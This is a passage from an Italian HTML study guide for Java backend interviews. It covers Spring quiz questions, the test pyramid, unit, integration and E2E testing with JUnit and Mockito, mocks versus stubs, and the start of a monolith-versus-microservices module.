                            <label for="q4d">Durante <code>postProcessBeforeInitialization()</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q4')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q4"></div>
                </div>

                <!-- Question 5 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Quale livello di isolamento previene i <strong>Phantom Reads</strong> ma permette i <strong>Non-Repeatable Reads</strong>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q4" id="q5a" value="a">
                            <label for="q5a"><code>READ_COMMITTED</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q5" id="q5b" value="b">
                            <label for="q5b"><code>REPEATABLE_READ</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q5" id="q5c" value="c">
                            <label for="q5c">Nessuno: è impossibile prevenire Phantom Reads senza prevenire prima Non-Repeatable Reads</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q5" id="q5d" value="d">
                            <label for="q5d"><code>SERIALIZABLE</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q5')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q5"></div>
                </div>
            </section>

            <!-- Links Modulo 1 -->
            <section class="section" id="modulo1-links">
                <h2>Link di Approfondimento - Modulo 1</h2>

                <div class="info-box">
                    <h4>Spring Framework</h4>
                    <p><a href="https://docs.spring.io/spring-framework/reference/" target="_blank">Spring Framework Documentation</a> - Documentazione ufficiale</p>
                    <p><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/" target="_blank">Spring Boot Reference</a> - Guida completa Spring Boot</p>
                    <p><a href="https://www.baeldung.com/spring-tutorial" target="_blank">Baeldung: Spring Tutorial</a> - Tutorial completi</p>
                    <p><a href="https://spring.io/guides" target="_blank">Spring Guides</a> - Guide ufficiali passo-passo</p>
                </div>

                <div class="info-box">
                    <h4>IoC & Dependency Injection</h4>
                    <p><a href="https://docs.spring.io/spring-framework/reference/core/beans.html" target="_blank">Spring: IoC Container</a> - Documentazione IoC</p>
                    <p><a href="https://www.baeldung.com/inversion-control-and-dependency-injection-in-spring" target="_blank">Baeldung: IoC and DI in Spring</a></p>
                    <p><a href="https://martinfowler.com/articles/injection.html" target="_blank">Martin Fowler: Dependency Injection</a> - Articolo fondamentale</p>
                </div>

                <div class="info-box">
                    <h4>Spring AOP & Proxy</h4>
                    <p><a href="https://docs.spring.io/spring-framework/reference/core/aop.html" target="_blank">Spring AOP Documentation</a></p>
                    <p><a href="https://www.baeldung.com/spring-aop" target="_blank">Baeldung: Introduction to Spring AOP</a></p>
                    <p><a href="https://www.baeldung.com/spring-transactional-propagation-isolation" target="_blank">Baeldung: @Transactional Propagation and Isolation</a></p>
                </div>

                <div class="info-box">
                    <h4>JPA & Hibernate</h4>
                    <p><a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/" target="_blank">Spring Data JPA Reference</a></p>
                    <p><a href="https://www.baeldung.com/the-persistence-layer-with-spring-and-jpa" target="_blank">Baeldung: JPA with Spring</a></p>
                    <p><a href="https://vladmihalcea.com/tutorials/hibernate/" target="_blank">Vlad Mihalcea: Hibernate Tutorials</a> - Esperto JPA/Hibernate</p>
                    <p><a href="https://www.baeldung.com/hibernate-common-performance-problems-in-logs" target="_blank">Baeldung: N+1 Problem</a></p>
                </div>

                <div class="info-box">
                    <h4>Spring Security</h4>
                    <p><a href="https://docs.spring.io/spring-security/reference/index.html" target="_blank">Spring Security Reference</a></p>
                    <p><a href="https://www.baeldung.com/security-spring" target="_blank">Baeldung: Spring Security Tutorials</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 2: TESTING STRATEGY ==================== -->

            <header class="module-header" id="modulo2" style="margin-top: 80px;">
                <span class="module-tag">Modulo 2</span>
                <h1>Testing Strategy</h1>
                <p>Dalla Test Pyramid al TDD: strategie e best practices per scrivere test efficaci e mantenibili</p>
            </header>

            <!-- Test Pyramid Section -->
            <section class="section" id="modulo2-pyramid">
                <h2>The Test Pyramid</h2>

                <p>La <strong>Test Pyramid</strong> è un modello concettuale introdotto da Mike Cohn che illustra come dovrebbe essere distribuito lo sforzo di testing in un progetto software. La forma piramidale indica che dovresti avere molti più test alla base (unit) e progressivamente meno salendo verso l'alto.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                           THE TEST PYRAMID                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                              ▲                                              │
│                             ╱ ╲            E2E / UI Tests                   │
│                            ╱   ╲           ─────────────────                │
│                           ╱     ╲          • Pochi (5-10%)                  │
│                          ╱  E2E  ╲         • Lenti (minuti)                 │
│                         ╱─────────╲        • Fragili                        │
│                        ╱           ╲       • Alto costo manutenzione        │
│                       ╱             ╲                                       │
│                      ╱───────────────╲                                      │
│                     ╱                 ╲    Integration Tests                │
│                    ╱    INTEGRATION    ╲   ──────────────────               │
│                   ╱                     ╲  • Moderati (15-25%)              │
│                  ╱───────────────────────╲ • Velocità media (secondi)       │
│                 ╱                         ╲• Testano interazioni            │
│                ╱                           ╲                                │
│               ╱─────────────────────────────╲                               │
│              ╱                               ╲  Unit Tests                  │
│             ╱            UNIT                 ╲ ────────────                │
│            ╱                                   ╲• Molti (70-80%)            │
│           ╱─────────────────────────────────────╲ Velocissimi (ms)         │
│          ╱                                       ╲• Isolati                 │
│         ╱                                         ╲• Facili da mantenere    │
│        ╱───────────────────────────────────────────╲                        │
│                                                                             │
│   COSTO ←──────────────────────────────────────────────────────────→ BASSO  │
│   ALTO                                                                      │
│                                                                             │
│   VELOCITÀ ←────────────────────────────────────────────────────────→ ALTA  │
│   BASSA                                                                     │
│                                                                             │
│   FEEDBACK ←────────────────────────────────────────────────────────→ RAPIDO│
│   LENTO                                                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <div class="info-box">
                    <h4>Perché questa forma?</h4>
                    <p>I test alla base (unit) sono <strong>veloci</strong>, <strong>economici</strong> da scrivere e mantenere, e forniscono <strong>feedback immediato</strong>. Salendo nella piramide, i test diventano più costosi, più lenti, e più fragili (prone a fallire per ragioni non legate al codice testato). L'obiettivo è massimizzare la copertura con i test più economici.</p>
                </div>

                <h3>Anti-Pattern: Ice Cream Cone</h3>

                <p>Molti team cadono nel pattern "Ice Cream Cone" (piramide invertita): troppi test E2E, pochi unit test. Questo porta a:</p>

                <ul>
                    <li><strong>Build lente</strong>: la CI impiega ore invece di minuti</li>
                    <li><strong>Feedback tardivo</strong>: scopri i bug solo alla fine della pipeline</li>
                    <li><strong>Flaky tests</strong>: test che falliscono in modo intermittente per timeout, race condition, o dipendenze esterne</li>
                    <li><strong>Paralisi del refactoring</strong>: paura di modificare il codice perché i test si rompono continuamente</li>
                </ul>

                <div class="info-box warning">
                    <h4>Domanda da colloquio</h4>
                    <p>"Come gestiresti una codebase con 500 test E2E e solo 50 unit test?"<br><br>
                    <strong>Risposta:</strong> Inizierei identificando i test E2E che verificano logica di business pura e li convertirei in unit test. Userei i test E2E esistenti come "safety net" temporanea mentre costruisco la copertura unit. Introdurrei metriche di code coverage per guidare le priorità e stabilirei una policy "no new E2E tests" per funzionalità testabili a livello unit.</p>
                </div>
            </section>

            <!-- Test Types Section -->
            <section class="section" id="modulo2-types">
                <h2>Unit vs Integration vs E2E Tests</h2>

                <h3>Unit Tests</h3>

                <p>Gli <strong>Unit Tests</strong> verificano il comportamento di una singola unità di codice (classe, metodo, funzione) in <strong>completo isolamento</strong>. Tutte le dipendenze esterne vengono sostituite con test doubles (mock, stub, fake).</p>

                <pre><code class="language-java">// Classe da testare
public class PriceCalculator {
    private final DiscountService discountService;
    private final TaxService taxService;

    public PriceCalculator(DiscountService discountService, TaxService taxService) {
        this.discountService = discountService;
        this.taxService = taxService;
    }

    public BigDecimal calculateFinalPrice(Product product, Customer customer) {
        BigDecimal basePrice = product.getPrice();
        BigDecimal discount = discountService.getDiscount(customer);
        BigDecimal discountedPrice = basePrice.multiply(BigDecimal.ONE.subtract(discount));
        BigDecimal tax = taxService.calculateTax(discountedPrice, customer.getCountry());
        return discountedPrice.add(tax);
    }
}

// Unit Test - isolato con mock
@ExtendWith(MockitoExtension.class)
class PriceCalculatorTest {

    @Mock
    private DiscountService discountService;

    @Mock
    private TaxService taxService;

    @InjectMocks
    private PriceCalculator calculator;

    @Test
    void shouldApplyDiscountBeforeTax() {
        // Given
        Product product = new Product("Laptop", new BigDecimal("1000.00"));
        Customer customer = new Customer("IT");

        when(discountService.getDiscount(customer))
            .thenReturn(new BigDecimal("0.10")); // 10% discount

        when(taxService.calculateTax(eq(new BigDecimal("900.00")), eq("IT")))
            .thenReturn(new BigDecimal("198.00")); // 22% IVA

        // When
        BigDecimal finalPrice = calculator.calculateFinalPrice(product, customer);

        // Then
        assertThat(finalPrice).isEqualByComparingTo(new BigDecimal("1098.00"));

        // Verify interaction order
        InOrder inOrder = inOrder(discountService, taxService);
        inOrder.verify(discountService).getDiscount(customer);
        inOrder.verify(taxService).calculateTax(any(), any());
    }

    @Test
    void shouldHandleZeroDiscount() {
        // Given
        Product product = new Product("Mouse", new BigDecimal("50.00"));
        Customer customer = new Customer("IT");

        when(discountService.getDiscount(customer)).thenReturn(BigDecimal.ZERO);
        when(taxService.calculateTax(any(), any())).thenReturn(new BigDecimal("11.00"));

        // When
        BigDecimal finalPrice = calculator.calculateFinalPrice(product, customer);

        // Then
        assertThat(finalPrice).isEqualByComparingTo(new BigDecimal("61.00"));
    }
}</code></pre>

                <h3>Integration Tests</h3>

                <p>Gli <strong>Integration Tests</strong> verificano che più componenti funzionino correttamente <strong>insieme</strong>. Tipicamente testano l'interazione tra il codice applicativo e sistemi esterni (database, message broker, API esterne).</p>

                <pre><code class="language-java">// Integration Test con Spring Boot e database reale (H2/TestContainers)
@SpringBootTest
@Transactional  // Rollback automatico dopo ogni test
class OrderServiceIntegrationTest {

    @Autowired
    private OrderService orderService;

    @Autowired
    private OrderRepository orderRepository;

    @Autowired
    private CustomerRepository customerRepository;

    @Test
    void shouldPersistOrderWithItems() {
        // Given
        Customer customer = customerRepository.save(
            new Customer("Mario Rossi", "mario@example.com")
        );

        CreateOrderRequest request = CreateOrderRequest.builder()
            .customerId(customer.getId())
            .items(List.of(
                new OrderItemRequest("PROD-001", 2),
                new OrderItemRequest("PROD-002", 1)
            ))
            .build();

        // When
        Order order = orderService.createOrder(request);

        // Then
        assertThat(order.getId()).isNotNull();
        assertThat(order.getItems()).hasSize(2);

        // Verify persistence
        Order persistedOrder = orderRepository.findById(order.getId()).orElseThrow();
        assertThat(persistedOrder.getCustomer().getName()).isEqualTo("Mario Rossi");
        assertThat(persistedOrder.getStatus()).isEqualTo(OrderStatus.CREATED);
    }

    @Test
    void shouldPublishEventWhenOrderCreated() {
        // Test che verifica l'integrazione con il message broker
        // ...
    }
}

// Integration Test con TestContainers (database reale)
@SpringBootTest
@Testcontainers
class OrderRepositoryIntegrationTest {

    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:15")
        .withDatabaseName("testdb")
        .withUsername("test")
        .withPassword("test");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }

    @Autowired
    private OrderRepository orderRepository;

    @Test
    void shouldFindOrdersByCustomerWithNativeQuery() {
        // Test di query complesse con database reale PostgreSQL
        // ...
    }
}</code></pre>

                <h3>E2E (End-to-End) Tests</h3>

                <p>I test <strong>E2E</strong> verificano l'intero flusso applicativo dal punto di vista dell'utente, attraversando tutti i layer (UI → API → Database → External Services).</p>

                <pre><code class="language-java">// E2E Test con REST Assured
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class OrderApiE2ETest {

    @LocalServerPort
    private int port;

    @Autowired
    private CustomerRepository customerRepository;

    @BeforeEach
    void setUp() {
        RestAssured.port = port;
        RestAssured.basePath = "/api/v1";
    }

    @Test
    void completeOrderFlow() {
        // 1. Create customer
        String customerId = given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "name": "Mario Rossi",
                    "email": "mario@example.com"
                }
                """)
            .when()
            .post("/customers")
            .then()
            .statusCode(201)
            .extract()
            .path("id");

        // 2. Create order
        String orderId = given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "customerId": "%s",
                    "items": [
                        {"productId": "PROD-001", "quantity": 2}
                    ]
                }
                """.formatted(customerId))
            .when()
            .post("/orders")
            .then()
            .statusCode(201)
            .body("status", equalTo("CREATED"))
            .extract()
            .path("id");

        // 3. Pay order
        given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "paymentMethod": "CREDIT_CARD",
                    "cardToken": "tok_visa_success"
                }
                """)
            .when()
            .post("/orders/{orderId}/pay", orderId)
            .then()
            .statusCode(200)
            .body("status", equalTo("PAID"));

        // 4. Verify final state
        given()
            .when()
            .get("/orders/{orderId}", orderId)
            .then()
            .statusCode(200)
            .body("status", equalTo("PAID"))
            .body("paymentDate", notNullValue());
    }
}</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Unit Test</th>
                            <th>Integration Test</th>
                            <th>E2E Test</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Scope</strong></td>
                            <td>Singola classe/metodo</td>
                            <td>Più componenti insieme</td>
                            <td>Intero sistema</td>
                        </tr>
                        <tr>
                            <td><strong>Dipendenze</strong></td>
                            <td>Tutte mockate</td>
                            <td>Alcune reali (DB, broker)</td>
                            <td>Tutte reali</td>
                        </tr>
                        <tr>
                            <td><strong>Velocità</strong></td>
                            <td>Millisecondi</td>
                            <td>Secondi</td>
                            <td>Minuti</td>
                        </tr>
                        <tr>
                            <td><strong>Feedback</strong></td>
                            <td>Specifico (quale metodo fallisce)</td>
                            <td>Moderato</td>
                            <td>Generico (qualcosa è rotto)</td>
                        </tr>
                        <tr>
                            <td><strong>Flakiness</strong></td>
                            <td>Quasi zero</td>
                            <td>Bassa</td>
                            <td>Alta</td>
                        </tr>
                        <tr>
                            <td><strong>Quando usare</strong></td>
                            <td>Logica di business</td>
                            <td>Interazioni con DB/broker</td>
                            <td>Critical user journeys</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Mocking vs Stubbing Section -->
            <section class="section" id="modulo2-mocking">
                <h2>Mocking vs Stubbing</h2>

                <p>Questa distinzione è fondamentale e spesso confusa. <strong>Mock</strong> e <strong>Stub</strong> sono entrambi "Test Doubles" (sostituti di dipendenze reali), ma hanno scopi diversi.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        TEST DOUBLES TAXONOMY                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                           Test Double                                       │
│                               │                                             │
│         ┌─────────┬───────────┼───────────┬─────────┐                       │
│         │         │           │           │         │                       │
│         ▼         ▼           ▼           ▼         ▼                       │
│      ┌──────┐ ┌──────┐   ┌────────┐  ┌───────┐ ┌───────┐                    │
│      │ Dummy│ │ Fake │   │  Stub  │  │  Spy  │ │  Mock │                    │
│      └──────┘ └──────┘   └────────┘  └───────┘ └───────┘                    │
│         │         │           │           │         │                       │
│         │         │           │           │         │                       │
│    Placeholder  Working   Returns     Records   Verifies                    │
│    (never used) implem.   canned      calls +   behavior                    │
│                 (in-mem   answers     delegates (expectations)              │
│                  DB)                  to real                               │
│                                                                             │
│  ═══════════════════════════════════════════════════════════════════════    │
│                                                                             │
│                   STATE VERIFICATION                                        │
│                   ──────────────────                                        │
│                   Stub, Fake                                                │
│                   "Given this input, return this output"                    │
│                   Test verifica il RISULTATO                                │
│                                                                             │
│                   BEHAVIOR VERIFICATION                                     │
│                   ────────────────────                                      │
│                   Mock, Spy                                                 │
│                   "Verify this method was called with these args"           │
│                   Test verifica le INTERAZIONI                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Stub: State Verification</h3>

                <p>Uno <strong>Stub</strong> fornisce risposte predefinite alle chiamate. Non verifica come viene usato, solo che il sistema under test produca il risultato corretto dato quell'input.</p>

                <pre><code class="language-java">// STUB - Fornisce risposte predefinite
@Test
void shouldCalculateTotalWithDiscount_usingStub() {
    // Stub: definiamo solo COSA ritorna, non ci interessa COME viene chiamato
    DiscountService discountStub = new DiscountService() {
        @Override
        public BigDecimal getDiscount(Customer customer) {
            return new BigDecimal("0.15"); // Sempre 15%
        }
    };

    PriceCalculator calculator = new PriceCalculator(discountStub, taxService);

    // State verification: verifico solo il RISULTATO finale
    BigDecimal result = calculator.calculateFinalPrice(product, customer);
    assertThat(result).isEqualByComparingTo(expectedPrice);

    // NON verifichiamo se/come getDiscount() è stato chiamato
}

// Con Mockito: when() crea uno STUB
@Test
void shouldCalculateTotalWithDiscount_usingMockitoStub() {
    // Questo è tecnicamente uno STUB, anche se usiamo @Mock
    when(discountService.getDiscount(any())).thenReturn(new BigDecimal("0.15"));

    BigDecimal result = calculator.calculateFinalPrice(product, customer);

    assertThat(result).isEqualByComparingTo(expectedPrice);
    // Nessun verify() = state verification
}</code></pre>

                <h3>Mock: Behavior Verification</h3>

                <p>Un <strong>Mock</strong> è un oggetto pre-programmato con aspettative sulle chiamate che riceverà. Il test fallisce se le aspettative non vengono soddisfatte.</p>

                <pre><code class="language-java">// MOCK - Verifica il comportamento/interazioni
@Test
void shouldNotifyWarehouseWhenOrderPlaced_usingMock() {
    // Given
    Order order = new Order(customer, List.of(item1, item2));

    // Mock: ci interessa verificare CHE venga chiamato e COME
    WarehouseService warehouseMock = mock(WarehouseService.class);
    OrderService orderService = new OrderService(warehouseMock);

    // When
    orderService.placeOrder(order);

    // Behavior verification: verifichiamo le INTERAZIONI
    verify(warehouseMock).reserveStock(order.getItems());
    verify(warehouseMock, times(1)).scheduleShipment(order);
    verify(warehouseMock, never()).cancelReservation(any());

    // Verifica dell'ordine delle chiamate
    InOrder inOrder = inOrder(warehouseMock);
    inOrder.verify(warehouseMock).reserveStock(any());
    inOrder.verify(warehouseMock).scheduleShipment(any());
}

// Argument Captor per verifiche più sofisticate
@Test
void shouldSendCorrectEmailContent() {
    // Given
    ArgumentCaptor&lt;Email&gt; emailCaptor = ArgumentCaptor.forClass(Email.class);

    // When
    userService.registerUser(newUser);

    // Then - cattura l'argomento passato al mock
    verify(emailService).send(emailCaptor.capture());

    Email sentEmail = emailCaptor.getValue();
    assertThat(sentEmail.getTo()).isEqualTo(newUser.getEmail());
    assertThat(sentEmail.getSubject()).contains("Welcome");
    assertThat(sentEmail.getBody()).contains(newUser.getName());
}</code></pre>

                <div class="info-box warning">
                    <h4>Quando usare Mock vs Stub?</h4>
                    <ul>
                        <li><strong>Usa Stub</strong> quando ti interessa solo il risultato (es: calcoli, trasformazioni, query)</li>
                        <li><strong>Usa Mock</strong> quando ti interessa verificare che un side-effect avvenga (es: email inviata, evento pubblicato, audit log scritto)</li>
                        <li><strong>Evita over-mocking</strong>: se ti trovi a verificare ogni singola chiamata, probabilmente stai testando l'implementazione invece del comportamento</li>
                    </ul>
                </div>

                <h3>Spy: Il meglio di entrambi i mondi</h3>

                <p>Uno <strong>Spy</strong> avvolge un oggetto reale, permettendo di tracciare le chiamate e opzionalmente sovrascrivere alcuni metodi.</p>

                <pre><code class="language-java">@Test
void shouldUseRealImplementationButTrackCalls() {
    // Spy su implementazione reale
    List&lt;String&gt; realList = new ArrayList&lt;&gt;();
    List&lt;String&gt; spyList = spy(realList);

    // Usa implementazione reale
    spyList.add("one");
    spyList.add("two");

    // Ma possiamo verificare le chiamate
    verify(spyList).add("one");
    verify(spyList, times(2)).add(anyString());

    // E sovrascrivere comportamenti specifici
    doReturn(100).when(spyList).size();
    assertThat(spyList.size()).isEqualTo(100); // Stubbed
    assertThat(spyList.get(0)).isEqualTo("one"); // Real
}</code></pre>
            </section>

            <!-- Quiz Section Module 2 -->
            <section class="quiz-section" id="modulo2-quiz">
                <h2>Interactive Challenge Quiz - Testing</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Verifica la tua comprensione delle strategie di testing.</p>

                <!-- Question 6 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> Un test verifica che quando un utente si registra, viene inviata un'email di conferma. Quale tipo di test double è più appropriato per <code>EmailService</code>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q6" id="q6a" value="a">
                            <label for="q6a"><strong>Stub</strong> - configuro EmailService per ritornare <code>true</code> quando chiamato</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q6" id="q6b" value="b">
                            <label for="q6b"><strong>Mock</strong> - verifico che <code>emailService.send()</code> sia stato chiamato con i parametri corretti</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q6" id="q6c" value="c">
                            <label for="q6c"><strong>Fake</strong> - uso un'implementazione in-memory che salva le email in una lista</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q6" id="q6d" value="d">
                            <label for="q6d"><strong>Spy</strong> - avvolgo il vero EmailService per tracciare le chiamate senza mockare</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q6')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q6"></div>
                </div>

                <!-- Question 7 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Quale delle seguenti affermazioni sulla Test Pyramid è CORRETTA?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q7" id="q7a" value="a">
                            <label for="q7a">I test E2E dovrebbero coprire il 70-80% della codebase perché verificano il comportamento reale dell'utente</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q7" id="q7b" value="b">
                            <label for="q7b">Gli Integration Test sono più affidabili degli Unit Test perché non usano mock</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q7" id="q7c" value="c">
                            <label for="q7c">I test E2E sono più "flaky" (instabili) perché dipendono da più componenti e fattori esterni</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q7" id="q7d" value="d">
                            <label for="q7d">Nel TDD, tutti i test devono essere scritti prima di iniziare a scrivere codice di produzione</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q7')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q7"></div>
                </div>

                <!-- Question 8 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Stai testando un <code>PaymentService</code> che chiama un gateway esterno. Il test deve verificare che venga applicato un retry in caso di fallimento temporaneo. Qual è l'approccio migliore?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q9" id="q9a" value="a">
                            <label for="q9a">Uso un Mock del gateway che fallisce le prime 2 chiamate e poi succede, verificando che <code>process()</code> sia chiamato 3 volte</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q9" id="q9b" value="b">
                            <label for="q9b">Uso un test E2E con un gateway di staging che simula fallimenti</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q9" id="q9c" value="c">
                            <label for="q9c">Uso uno Stub che ritorna sempre successo, verificando solo il risultato finale</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q9" id="q9d" value="d">
                            <label for="q9d">Non è possibile testare la retry logic in modo isolato, serve sempre un Integration Test</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q9')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q9"></div>
                </div>

                <!-- Question 10 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q4.</span> Quale test ha la maggior probabilità di essere "flaky" (fallire in modo intermittente)?</h4>
                    <pre><code class="language-java">// Test A
@Test void testA() {
    when(repo.findById(1L)).thenReturn(Optional.of(user));
    assertThat(service.getUser(1L)).isEqualTo(user);
}

// Test B
@Test void testB() {
    User saved = userRepository.save(new User("test@mail.com"));
    await().atMost(5, SECONDS).until(() ->
        searchService.findByEmail("test@mail.com") != null);
}

// Test C
@Test void testC() {
    assertThat(calculator.add(2, 3)).isEqualTo(5);
}

// Test D
@Test void testD() {
    User user = userRepository.save(new User("mario"));
    assertThat(userRepository.findById(user.getId())).isPresent();
}</code></pre>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q10" id="q10a" value="a">
                            <label for="q10a">Test A - perché usa mock che potrebbero non corrispondere alla realtà</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q10" id="q10b" value="b">
                            <label for="q10b">Test B - perché dipende da timing/eventual consistency con <code>await()</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q10" id="q10c" value="c">
                            <label for="q10c">Test C - perché i calcoli matematici possono avere problemi di floating point</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q10" id="q10d" value="d">
                            <label for="q10d">Test D - perché l'ID generato potrebbe collidere con dati esistenti</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q10')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q10"></div>
                </div>
            </section>

            <!-- Links Modulo 2 -->
            <section class="section" id="modulo2-links">
                <h2>Link di Approfondimento - Modulo 2</h2>

                <div class="info-box">
                    <h4>Test Pyramid & Strategy</h4>
                    <p><a href="https://martinfowler.com/articles/practical-test-pyramid.html" target="_blank">Martin Fowler: The Practical Test Pyramid</a> - Articolo fondamentale</p>
                    <p><a href="https://testing.googleblog.com/2015/04/just-say-no-to-more-end-to-end-tests.html" target="_blank">Google: Just Say No to More E2E Tests</a></p>
                    <p><a href="https://www.baeldung.com/java-unit-testing-best-practices" target="_blank">Baeldung: Unit Testing Best Practices</a></p>
                </div>

                <div class="info-box">
                    <h4>JUnit 5 & Mockito</h4>
                    <p><a href="https://junit.org/junit5/docs/current/user-guide/" target="_blank">JUnit 5 User Guide</a> - Documentazione ufficiale</p>
                    <p><a href="https://site.mockito.org/" target="_blank">Mockito Documentation</a></p>
                    <p><a href="https://www.baeldung.com/mockito-series" target="_blank">Baeldung: Mockito Tutorial</a></p>
                    <p><a href="https://www.baeldung.com/mockito-spy" target="_blank">Baeldung: Mockito Spy</a></p>
                </div>

                <div class="info-box">
                    <h4>Spring Boot Testing</h4>
                    <p><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.testing" target="_blank">Spring Boot Testing Documentation</a></p>
                    <p><a href="https://www.baeldung.com/spring-boot-testing" target="_blank">Baeldung: Testing in Spring Boot</a></p>
                    <p><a href="https://www.testcontainers.org/" target="_blank">Testcontainers</a> - Container per integration testing</p>
                </div>

                <div class="info-box">
                    <h4>TDD & Best Practices</h4>
                    <p><a href="https://www.jamesshore.com/v2/books/aoad1/test_driven_development" target="_blank">James Shore: TDD</a> - Introduzione al TDD</p>
                    <p><a href="https://blog.cleancoder.com/uncle-bob/2014/12/17/TheCyclesOfTDD.html" target="_blank">Uncle Bob: The Cycles of TDD</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 3: ARCHITETTURA & SCALABILITÀ ==================== -->

            <header class="module-header" id="modulo3" style="margin-top: 80px;">
                <span class="module-tag">Modulo 3</span>
                <h1>Architettura & Scalabilità</h1>
                <p>Pattern architetturali, resilienza e strategie per sistemi distribuiti ad alta disponibilità</p>
            </header>

            <!-- Monolith vs Microservices Section -->
            <section class="section" id="modulo3-monolith-micro">
                <h2>Monoliti vs Microservizi</h2>

                <p>La scelta tra architettura monolitica e microservizi è una delle decisioni più importanti nella progettazione di un sistema. Non esiste una risposta universale: dipende dal contesto, dal team e dalla fase del prodotto.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MONOLITH vs MICROSERVICES                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   MONOLITH                              MICROSERVICES                       │
│   ────────                              ─────────────                       │
│                                                                             │
│   ┌─────────────────────┐               ┌───────┐ ┌───────┐ ┌───────┐      │
│   │                     │               │ User  │ │ Order │ │ Pay   │      │
│   │   ┌─────────────┐   │               │Service│ │Service│ │Service│      │
│   │   │   Web UI    │   │               └───┬───┘ └───┬───┘ └───┬───┘      │
│   │   └─────────────┘   │                   │         │         │          │
│   │   ┌─────────────┐   │                   │    ┌────┴────┐    │          │
│   │   │  Business   │   │                   └────┤ Message ├────┘          │
│   │   │   Logic     │   │                        │  Broker │               │
│   │   └─────────────┘   │                        └────┬────┘               │
│   │   ┌─────────────┐   │               ┌───────┐ ┌───┴───┐ ┌───────┐      │
│   │   │  Data Layer │   │               │  DB   │ │  DB   │ │  DB   │      │
│   │   └─────────────┘   │               │ User  │ │ Order │ │ Pay   │      │
│   │                     │               └───────┘ └───────┘ └───────┘      │
│   └──────────┬──────────┘                                                  │
│              │                                                             │
│        ┌─────┴─────┐                                                       │
│        │    DB     │                                                       │
│        └───────────┘                                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Monolith: Pro e Contro</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Semplicità di sviluppo e deploy</td>
                            <td>Scaling solo verticale (o replica intera)</td>
                        </tr>
                        <tr>
                            <td>Transazioni ACID semplici</td>
                            <td>Codebase che cresce e diventa ingestibile</td>
                        </tr>
                        <tr>
